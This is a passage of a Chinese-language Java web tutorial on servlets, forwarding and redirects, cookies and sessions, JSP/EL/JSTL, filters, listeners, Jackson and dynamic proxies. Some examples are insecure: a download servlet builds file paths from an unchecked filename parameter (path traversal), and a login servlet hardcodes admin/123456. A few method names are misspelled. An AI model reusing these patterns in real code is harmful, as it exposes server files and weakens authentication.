        req.setCharacterEncoding("utf-8"); // 设置编码
        String username = req.getParameter("username");//获取提交的 username值
        System.out.println(username);

        String[] usernames = req.getParameterValues("username");
        for (String s:usernames) {
            System.out.println(s);
        }

        Enumeration<String> headerNames = req.getHeaderNames();//获取所有参数名
        while (headerNames.hasMoreElements()){
            String s = headerNames.nextElement(); // 遍历参数名
            System.out.println(s);
            String value = req.getParameter(s);
            System.out.println(value);
        }

        Map<String, String[]> parameterMap = req.getParameterMap();
        Set<String> strings = parameterMap.keySet(); // 获取所有键名
        for (String name:strings) {
            String[] strings1 = parameterMap.get(name);// 使用get方法，获取所有键值
            System.out.println(strings1);
            for (String value:strings1) {
                System.out.println(value);
            }
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

tomcat8版本后，get请求乱码已解决，但是在post里面需要手工设置。

#### 请求转发

可定义两个servlet将该请求转发到另一个servlet里面进行处理。

常用方法：

```txt
通过request对象获取请求转发器： RequestDispatcher getRequestDispatcher(String path)

通过RequestDispatcher 对象来进行转发，
forward(ServletRequest request,ServletResponse response)
```

Dispatcher1.java

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo6")
public class Dispatcher1 extends HttpServletTest{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.getRequestDispatcher("/demo7").forward(req,resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

Dispatcher2.java

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo7")
public class Dispatcher2 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("dispatcher2 demo7 被访问");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

访问`http://localhost:8080/demo6` ，请求转发到 `demo7` ,但是 url 没有跳转，和重定向的区别。

这种方法只能访问服务器内部资源，而且请求被转发时url不会进行跳转。

#### 共享数据

```txt
域对象： 一个有作用范围的对象，可以在范围内共享数据
request域：代表一次请求的范围，一般用于请求转发的多个资源中共享数据
```

方法：

```txt
1. void setAttribute(String name,Object obj):存储数据
2. Object getAttitude(String name):通过键获取值
3. void removeAttribute(String name):通过键移除键值对
```

使用上边的`Dispatcher1`和`Dispatcher2` 做案例

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo6")
public class Dispatcher1 extends HttpServletTest{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setAttribute("name","yanmie");
        req.getRequestDispatcher("/demo7").forward(req,resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/demo7")
public class Dispatcher2 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("dispatcher2 demo7 被访问");
        Object name = req.getAttribute("name");
        System.out.println(name);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

## Response篇

#### Response

常用方法：

```txt
setStatus(int sc)  : 设置响应状态码

setHeader(String name, String value)   设置响应头

resp.sendRedirect(String Redirect);      302跳转

```

这里的转发和重定向不一样，区别：

重定向：

1. 地址栏发生变化
2. 重定向可以访问其他站点的资源
3. 重定向是两次请求，不能使用 request 对象来共享数据

转发：

1. 转发地址栏路径不变
2. 转发只能访问当前服务器下的资源
3. 转发是一次请求，可以使用 request 对象来共享数据

#### 重定向代码

Resp1.java

```java
package test.resp;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/resp1")
public class Resp1 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setStatus(302);
        resp.setHeader("location","/resp2");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

Resp2.java

```java
package test.resp;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/resp2")
public class Resp2 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("已跳转");
        resp.sendRedirect("http://www.baidu.com/");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

访问 `/resp1` 即可跳转到 www.baidu.com

#### Writer方法使用

```java
package test.resp;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(urlPatterns = "/resp3")
public class Resp3 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setCharacterEncoding("gbk");
        PrintWriter writer = resp.getWriter();
        writer.write("response");
        writer.println("12345");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

输出字节流

```java
ServletOutputStream outputStream = resp.getOutputStream();
        outputStream.write("Abc".getBytes(StandardCharsets.UTF_8));
```

#### ServletContext

ServletContext：代表整个Web应用，可以和程序的容器(服务器)来通信。

常用方法：

```java
request.getServletContext();   : 通过request对象获取
this.getServletContext();     : 通过HttpServlet获取

String getMimeType(String file)  : 获取MIME对象


域对象：共享数据

1. setAttribute(String name,Object value)
2. getAttribute(String name)
3. removeAttribute(String name)

获取文件的真实(服务器)路径：

String getRealPath(String path) 

```

文件下载小案例：

编写一个 html 页面，里面写一个超链接对图片进行下载：

html:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>downlaod</title>
</head>
<body>

<a href="/demo/img/1.jpg">图片查看</a>

<a href="downloadServlet?filename=1.jpg">图片下载</a>

</body>
</html>
```

downloadServlet.java

```java
@WebServlet("/downloadServlet")
public class downloadServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {


        this.doGet(request,response);
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {


        String filename = request.getParameter("filename");  //接收filename传参的值
            ServletContext servletContext = this.getServletContext();   //创建servletContext 对象
            String Path = servletContext.getRealPath("/img/" + filename);  //获取文件真实路径

        String mimeType = servletContext.getMimeType(filename);//获取mimel类型





        FileInputStream fis = new FileInputStream(Path);   //路径参数文件输入流对象中
        response.setHeader("content-type",mimeType);  //响应头设置mime类型
        response.setHeader("content-disposition","attachment;filename="+filename); //设置为附件类型
            ServletOutputStream outputStream = response.getOutputStream();   //获取文件输出流
            byte[] buff = new byte[1024];   //设置每次读取的字节大小
            int len =0;
            while ((len = fis.read(buff))!=-1){     

                outputStream.write(buff,0,len);  
            }

    }
}

```

## Cookie与Session篇

#### Cookie

客户端会话技术，将数据保存到客户端。

常见方法：

1. 创建Cookie对象，绑定数据

   ```java
   new Cookie(String name,String value)
   ```

2. 发送Cookie对象

   ```java
   response.addCookie(Cookie cookie)
   ```

3. 获取Cookie，拿到数据

   ```java
   Cookie[] request.getCookies()
   ```

4. setMaxAge(int seconds)

   正数：将Cookie数据写到硬盘的文件中。持久化存储。并指定Cookie存活时间，时间到后，cookie文件自动失效。

   负数：默认值

   零：删除Cookie信息

5. setPath(String path): 设置cookie的获取范围。默认情况下，设置为当前的虚拟目录

   如果要共享，则可以将path设置为 “/” ，cookie 默认情况下不共享

6. setDoamin(String path): 如果设置一级域名相同，那么多个服务器之间Cookie可以共享

Cookie1.java

```java
package test.cookie;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/cookie1")
public class Cookie1 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Cookie cookie = new Cookie("name", "yanmie");
        cookie.setMaxAge(10);  //设置Cookie存储10s
        cookie.setPath("/");   // 设置共享

        resp.addCookie(cookie);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

Cookie2.java

```java
package test.cookie;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet(urlPatterns = "/cookie2")
public class Cookie2 extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Cookie[] cookies = req.getCookies();
        for (Cookie cookie:cookies) {
            System.out.println(cookie.getName());
            System.out.println(cookie.getValue());
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

#### Session

服务端会话技术，再一次会话的多次请求间共享数据，将数据保存在服务端的对象中。

常用方法：

```java
request.getSession()  获取session 对象
    
session方法
Object getAttribute(String name)
void setAttribute(String name,Object value)
void removeAttribute(String name)
```

Cookie与Session不同的地方是Cookie是存放于客户端，而session

是存在服务器上。

如果客户端关闭后，服务端不关闭，session需要相同，则可以创建Cookie，键为 JSESSIONID ,设置最大存活时间，让Cookie持久化保存。

session.java

```java
package test.cookie;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.*;
import java.io.IOException;

@WebServlet(urlPatterns = "/session")
public class Session extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        HttpSession session = req.getSession();
        Cookie jsessionid = new Cookie("JSESSIONID", session.getId());

        jsessionid.setMaxAge(10);
        jsessionid.setPath("/");
        resp.addCookie(jsessionid);

    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}
```

在贴一段解释，

> java web为了确保请求是同一个会话发生的，采取Session机制，即将sessionid存储在浏览器客户端Cookie，session对象实例存储在服务器端，请求发生时，HttpServletRequest对象将sessionId传入服务器端，服务器端通过sessionId查询响应的Session实例。

## EL与JSTL篇

#### EL表达式

EL的全称是Expression Language 是一种表达式语言，该语言主要用于替换jsp页面中 java 的代码。

语法：

```java
${表达式}
```

jsp默认是支持 el 表达式的，如果要忽略表达式的作用，需要在 jsp 中 page 指令 isEllgnored 为 true。

或者说直接使用反斜杠注释

```jsp
\${2*3}
```

EL 运算符

1. 算数运算符： +   -   *   /   div   mod   %

2. 逻辑运算符： &&    ||   ！

3. 空运算符：   empty   用于判断字符串、集合、数组对象是否为 null 或者长度是否为 0 

   ${empty list} ： 判断字符串、集合、数组对象是否为 null或者长度为0

   ${not empty str}: 表示字符串、集合、数组对象是否不为null并且长度 >0

获取值：

EL表达式需要从域对象中获取值

获取值语法：

```
${域名称.键名}： 从指定域中获取指定键的值
```

在这里来看看几个域名称都有哪些

域名称：

1. pageScope
2. requesScope
3. sessionScope
4. applicationScope

代码：

```jsp
<%
    request.setAttribute("name","yanmie");
%>
${requestScope.name}
${name}
```

这里可以直接使用键名获取，会依次从最小的域里面去查找是否有对应的值。

获取集合的值：

```txt
获取对象、list集合、Map集合的值
1.对象： ${域名称.键名.属性名}
	本质上去调用对象的getter方法
2.List集合：${域名称.键名[索引]}
3.Map集合
	${域名称.键名.key名称}
	${域名称.键名["key名称"]}
```

#### JSTL

全称是 JavaServer Pages Tag Libary  Jsp标准标签库

> 1、 JSTL的引入可以让JSP代码中<%%>等代码消失掉，再结合EL表达式，会更加方便以及美观。
>
> 2、 各套框架（还没有学习，比如struts,SpringMVC等）都有自己的标签库，这时JSTL可以作为公共、通用的，横行于各框架中。

导入 jstl包.

https://blog.csdn.net/YyjYsj/article/details/108853468

```jsp
<%@taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
```

先来看看里面有哪些标签：

```txt
1. if 标签， test 必须属性，接收 boolean 表达式
2. choose: 相当于java代码的switch语句
		使用 chooose标签声明 ，相当于 switch声明
		使用 when 标签做判断，相当于 case
		使用 otherwise 标签做其他情况的声明，相当于default
3. foreach: 相当于java代码的for语句
```

遍历 list 代码：

```jsp
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %><%--

--%>
<%@ page contentType="text/html;charset=UTF-8" language="java"  %>
<html>
<head>
  <title>$Title$</title>
</head>
<%@taglib prefix="c" uri="http://java.sun.com/jstl/core" %>

<%
  List list = new ArrayList();
  list.add("aaa");
  list.add("bbb");
  list.add("ccc");

  request.setAttribute("list",list);


%>

<c:forEach begin="1" end="10" var="i" step="2" varStatus="s">
  ${i} <h3>${s.index}</h3> <h4> ${s.count} </h4><br>

</c:forEach>

</body>
</html>
```

## JSP篇

#### 概念

jsp的全称是 Java Server Pages , java 服务端页面

其实jsp本质上就是一个Servlet, jsp在解析的时候，中间件会自动转换成 .java 后缀文件。而 .java 文件会被中间件转换成字节码文件，这样才能被解析运行。

#### Jsp编写

jsp 定义格式：

1. `<% 代码 %>` 定义的java代码，在Service方法中。service方法中可以定义什么，该脚本中就可以定义什么

2. `<%! 代码 %>` 定义的java代码，在jsp转换后的java类的成员位置

3. `<%= 代码 %>`  定义的java代码，会输出到页面上，输出语句中可以定义什么，该脚本就可以定义什么。

   `<%@ 指令名称 属性名1=属性值1 属性名2=属性值2 ... %>`

jsp指令：

1. page : 配置JSP页面的

   contentType : 等同于 response.setContentType()

   ​		设置响应体的 mime 类型以及字符集

   ​		设置当前jsp页面的编码（只能是高级的IDE才能生效，如果使用低级工具，则需要设置 pageEncoding 属性设置当前页面的字符集）

   import :  导包

   errorPage:  当前页面发生异常后，会自跳转到指定的错误页面

   isErrorPage: 标识当前也是否是错误页面

   ​		true:  是，可以使用内置对象 exception

   ​		false： 否，默认值，不可使用内置对象 exception

2. include :  页面包含的导入页面的资源文件

   `<%@ include file="top.jsp" %>`

3. taglib : 导入资源

   `<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>` 

## JSP九大内置对象

在JSP中无需创建就可以使用的9大对象

```txt
out(JspWriter) : 等同于response.getWriter(),用来向客户端发送文本数据
config(ServletConfig): 对应ServletConfig
page(当前JSP的真身类型): 当前JSP页面的this，即当前对象
pageContext(PageContext): 页面上下文对象
exception(Throwable): 只有在错误页面中可以使用这个对象
request(HttpServletRequest)
response(HttpServletResponse)
application(ServletContext)
session(HttpSession)
```

查看idea jsp编译后的文件方法：

查看启动日志`CATALINA_BASE` 的路径，+	`\work\Catalina\localhost\ROOT\org\apache\jsp`

https://blog.csdn.net/qq_20610631/article/details/81333816

## Filter与Listener篇

在一些登录点或者登录后才能使用的一些功能点里面，需要该用户登录后才能去访问或使用这些功能。但是我们如果每个servlet都去进行一个判断是否登录，很有很多重复代码，而且效率低。那么我们可以把这些代码都放到`Filter` 过滤器里面进行编写。

web里三大组件： servlet, filter,  listener

#### Filter过滤器

filter作用：当访问服务器的资源时，过滤器可以将请求拦截下来，完成一些特殊的功能。

一般用于完成一些统一的操作，比如登录验证。

定义步骤：

```txt
1. 定义一个类，实现接口Filter
2. 复写方法
3. 配置拦截路径
```

配置拦截路径有两种方式，分别是`web.xml` 和注解进行配置。

#### 注解配置拦截路径

```java
package test.filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebFilter("/*")
public class FilterTest1 implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("init");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("FileTest1 doFilter 执行");
        return;
        //filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("destory");
    }
}

```

web.xml 配置拦截路径：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <filter>
        <filter-name>test1</filter-name>
        <filter-class>test.filter.FilterTest1</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>test1</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</web-app>
```

`return` 不放行

`filterChain.doFilter(servletRequest,servletResponse);` 放行

Filter类需要重写3个方法，作用分别是：

1. init() : 在服务器启动后，会创建Filter对象，然后调用 init 方法，只执行一次，用户加载资源
2. doFilter:  每一次请求被拦截资源时，会执行。执行多次
3. destrot: 在服务关闭后，Filter对象被销毁，如果服务器正常关闭，则会执行destroy方法，只执行一次，用于释放资源

服务器首先会执行过滤器，再执行过滤器放行的资源，最后在执行过滤器放行后面的代码。

定义过滤器有多种方式：

1. 具体资源路径： /index.jsp  只有访问 index.jsp 资源时，过滤器才会被放行
2. 拦截目录： /user/*   访问 /user 下所有资源时，过滤器都会被执行
3. 后缀名拦截  *.jsp   访问所有后缀名为 jsp 资源时，过滤器都会被执行
4. 拦截所有资源： /*   访问所有资源，过滤器都会被执行

我们可以将后台的一些功能 servlet 定义为 admin/addUserServlet, 定义多一层目录，拦截器可以直接定义拦截路径为 /admin/* 这样，如果携带了登陆的 session 后，才选择放行。

#### 定义拦截方式

注解里面定义拦截路径，默认是 REQUEST 方式，也就是浏览器直接访问，使用转发或者是其他这些方式访问一样是会被拦截器给拦截。

如果我们需要使用转发访问资源不被拦截器拦截，可以在注解中配置 dispatcherTypes 属性的值。

dispatcherTypes 五种属性：

1. REQUEST:  默认值。浏览器直接请求资源
2. FORWARD: 转发访问资源
3. INCLUDE: 包含访问资源
4. ERROR: 错误跳转资源
5. ASYNC: 异步访问资源

```java
package test.filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter(value = "/*",dispatcherTypes = {DispatcherType.REQUEST,DispatcherType.FORWARD})  //定义浏览器请求和转发拦截器被执行
public class FilterTest2 implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("filtertest2 dofilter执行");
        filterChain.doFilter(servletRequest,servletResponse);  //放行
    }

    @Override
    public void destroy() {

    }
}
```

如果在web.xml里面进行配置，只需加入

```
REQUEST
```

web.xml:

```xml
    <filter>
        <filter-name>test2</filter-name>
        <filter-class>test.filter.FilterTest2</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>test2</filter-name>
        <url-pattern>/*</url-pattern>

        <dispatcher>REQUEST</dispatcher>
    </filter-mapping>
```

登录过滤器案例：

login.jsp

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>login</title>
</head>
<body>
<form action="/login" method="post">
用户名：<input type="text" name="username" />
密码：<input type="password" name="password">
    <input type="submit"/>
</form>
</body>
</html>
```

LoginConroller.java

```java
package test;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;

@WebServlet("/login")
public class LoginController extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doGet(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String username = req.getParameter("username");
        String password = req.getParameter("password");
        if(username.equals("admin") && password.equals("123456")){
            System.out.println("登陆成功");
            HttpSession httpSession = req.getSession();
            httpSession.setAttribute("user",username);
            System.out.println(req.getAttribute("user"));
            //req.getRequestDispatcher("/admin.html").forward(req,resp);
            resp.sendRedirect("/admin.html");
        }else{
            System.out.println("登录失败");
            resp.sendRedirect("/login.jsp");
        }
    }
}
```

FilterTest3.java

```java
package test.filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;

@WebFilter("/*")
public class FilterTest3 implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        HttpSession session = httpServletRequest.getSession();
        Object user = session.getAttribute("user");
        System.out.println(session.getAttribute("user"));
        if (httpServletRequest.getRequestURI().contains("login")){
            System.out.println("login");
            filterChain.doFilter(servletRequest,servletResponse);
        }else if (user!= null){
            System.out.println("放行");
            filterChain.doFilter(servletRequest,servletResponse);
        }else {
            System.out.println("拦截");
            httpServletRequest.getRequestDispatcher("/login.jsp").forward(servletRequest,servletResponse);
        }
    }

    @Override
    public void destroy() {

    }
}
```

写的不是很好。

#### Listener监听器

实践监听机制：

* 事件： 一件事情
* 事件源：事件发生的地方
* 监听器：一个对象
* 注册监听：将事件、事件源、监听器绑定在一起，当事件源上发生某个事件后，执行监听器代码。

listener 监听器实现：

首先我们需要实现 `ServletContextListener` 的接口，该接口并没有一个定于好的实现类，需要自己进行定义。

ServletConetxtListener 方法：

* void contextInitialized(ServletContextEvent servletContextEvent)  ServletContext 对象创建后会调用该方法
* void contextDestroyed(ServletContextEvent servletContextEvent)     ServletContext 对象销毁后会调用该方法

```java
package test.listener;

import javax.servlet.ServletContext;
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

@WebListener
public class ListenerTest implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent servletContextEvent) {
        ServletContext servletContext = servletContextEvent.getServletContext();
        String configLocation = servletContext.getInitParameter("configLocation");// 获取configLocation的参数
        String realPath = servletContext.getRealPath(configLocation);// 获取路径r
        try {
            FileInputStream fileInputStream = new FileInputStream(realPath);
            System.out.println(fileInputStream);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void contextDestroyed(ServletContextEvent servletContextEvent) {
        System.out.println("litener被销毁");
    }
}
```

web.xml

```xml
    <context-param>
        <param-name>configLocation</param-name>
        <param-value>/WEB-INF/config.xml</param-value>
    </context-param>
```

监听器一般用于默认加载资源。

https://blog.csdn.net/qq_15204179/article/details/82055448

推荐：https://www.cnblogs.com/w-wfy/p/6425357.html

## jackson篇

#### json

> 概述：JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于  ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得  JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。

> json主要用于数据交互，主要有键值对来表示。

而在Java里面需要解析json需要用到json的解析器。

#### jsckson解析器

常见有： `Jsonlib` , `Gson` , `fastjson`, `jsckson`

jackson:

常用方法：

1. readValue(json字符串数据,Class)      json转换为java对象

2. writeValue(参数1，obj):

   参数1：

   File：将obj对象转换为JSON字符串，并保存到指定的文件中

   Writer：将obj对象转换为JSON字符串，并将json数据填充到字符输出流中

   OutputStream：将obj对象转换为JSON字符串，并将json数据填充到字节输出流中

3. writeValueAsString(obj):将对象转为json字符串

注解：

1. @JsonIgnore : 排除属性
2. @JsonFormat:  属性值的格式化

#### 对象转Json

导入所需 jar 包

jar包的下载地址：

https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations

https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core

https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind

```java
public class Person {
    private String name;
    private int age;

    public Person() {
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}

```



```java
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class jsonTest {
    public static void main(String[] args) {
        Person person = new Person("yanmie",6);
        ObjectMapper mapper = new ObjectMapper();
        try {
            String s = mapper.writeValueAsString(person);
            System.out.println(s);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
    }
}
```

结果：

```txt
{"name":"yanmie","age":6}
```

#### list集合转换json

```java
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.util.ArrayList;

public class JsonTest2 {
    public static void main(String[] args) {
        Person p1 = new Person("yanmie", 6);
        Person p2 = new Person("tom", 12);
        ObjectMapper mapper = new ObjectMapper();
        ArrayList<Person> list = new ArrayList<>();
        list.add(p1);
        list.add(p2);
        try {
            String s = mapper.writeValueAsString(list);
            System.out.println(s);
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
    }
}
```

输出：

```txt
[{"name":"yanmie","age":6},{"name":"tom","age":12}]
```

#### json 转java对象

```java
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class jsonTest3 {
    public static void main(String[] args) {
        String json = "{\"name\":\"yanmie\",\"age\":6}";
        ObjectMapper mapper = new ObjectMapper();
        try {
            Person person = mapper.readValue(json, Person.class);
            System.out.println(person.toString());
        } catch (JsonProcessingException e) {
            e.printStackTrace();
        }
    }
}

```

输出：

```txt
Person{name='yanmie', age=6}
```

## 动态代理篇

动态代理是给目标对象提供一个代理对象，并由代理对象控制对目标对象的引用。

开发中使用动态代理的主要目的是`不改变目标对象方法的情况下对方法进行增强`。

概念：

1. 真实对象： 被代理的对象
2. 代理对象
3. 代理模式： 代理对象代理真实对象，达到增强真实对象功能的目的

案列：

```java
public interface Computer {
    public String method(double money);
    String show();
}

```

```java
public class Lenveo implements Computer{
    @Override
    public String method(double money) {
        System.out.println("花了+"+money+"买的电脑");
        return "电脑";
    }

    @Override
    public String show() {
        System.out.println("展示电脑");
        return "展示电脑";
    }
}
```

```java
public class Test {
    public static void main(String[] args) {
        Lenveo lenveo = new Lenveo();
        String method = lenveo.method(6666);
        String show = lenveo.show();
        System.out.println(method);
        System.out.println(show);
    }
}
```

这是一段正常的代码，如果我们需要再不改动其它类代码的情况下对其进行增强，那么就可以使用到动态代理。

使用代理：

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;

public class ProxyTest1 {
    public static void main(String[] args) {
        Lenveo lenveo = new Lenveo();

        Computer proxy = (Computer) Proxy.newProxyInstance(lenveo.getClass().getClassLoader(), lenveo.getClass().getInterfaces(), new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println("invoke 方法执行了");
                Object o = method.invoke(lenveo, args);
                return o;
            }
        });
        String method = proxy.method(6666);
        System.out.println(method);

    }
}

```

这里的 Proxy.newProxyInstance 方法传入了三个参数分别是：

1. 类的加载器：  new出来的真实对象.getClass().getClassLoader()
2. 接口数组：new 出来的真实对象.getClass().getInterfaces()
3. 处理器：new InvocationHandler()

使用动态代理，代理对象调用任意方法，代理的 invoke 方法都会执行。

invoke参数:

1. proxy  代理对象
2. method   代理对象调用的方法，被封装成的对象
3. args  代理对象调用方法适合传递的实际参数

## 框架

## JDBC篇

java数据库连接（Java Database Connectivity,简称JDBC）是java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法，JDBC夜市Sun Microsystems的商标。通常说的JDBC 是面向关系型数据库的。

实现原理：

1. Java通过java.sql.DriveManager来管理所有数据库的驱动注册，所以如果想要先建立数据库连接，需要现在 java.sql.DriveManager中注册相应的驱动类，然后调用 getConnection() 方法才能连接上数据库。
